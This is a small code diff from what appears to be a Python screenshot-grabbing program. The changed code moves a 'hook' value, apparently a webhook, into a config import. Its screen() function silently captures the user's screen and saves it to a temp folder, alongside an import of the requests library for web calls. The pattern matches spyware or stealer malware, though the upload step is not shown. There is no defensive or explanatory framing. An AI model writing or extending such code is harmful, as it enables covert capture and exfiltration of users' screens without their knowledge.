@@ -1,9 +1,9 @@
 import os.path, requests, os
 from PIL import ImageGrab
+from config import hook
 
 user = os.path.expanduser("~")
 
-hook = ""
 def screen():
  sss = ImageGrab.grab()
  sss.save(user+"\\AppData\\Local\\Temp\\ss.png")
